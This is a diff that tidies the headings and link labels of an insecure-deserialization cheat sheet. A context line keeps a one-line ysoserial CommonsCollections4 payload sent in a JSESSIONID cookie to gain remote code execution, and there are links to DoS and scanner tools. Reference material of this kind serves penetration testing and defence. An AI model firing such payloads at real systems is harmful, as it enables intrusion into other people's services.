@@ -1,8 +1,9 @@
 # Insecure Deserialization
 
 ## Table of Contents
+
 - [RCE](#rce)
-- [DoS](#dos)
+- [Denial of Service](#denial-of-service)
 - [Object Injection](#object-injection)
 
 ## RCE
@@ -14,13 +15,13 @@
     curl -X GET https://[VULNERABLE-SERVICE]/ -H "Cookie: JSESSIONID=$(java -jar ysoserial.jar CommonsCollections4 calc.exe | base64)"
     ```
 
-## DoS
+## Denial of Service
 
 ### Causes the application to consume excessive resources, leading to service unavailability.
 
 - DoS in Java-based services
-    - Github gist, [SerialDOS.java](https://gist.github.com/coekie/a27cc406fc9f3dc7a70d)
-    - Github repository, [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner/tree/master?tab=readme-ov-file#manual-tester)
+    - GitHub gist, [SerialDOS.java](https://gist.github.com/coekie/a27cc406fc9f3dc7a70d)
+    - GitHub repository, [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner/tree/master?tab=readme-ov-file#manual-tester)
 
 ## Object Injection
 
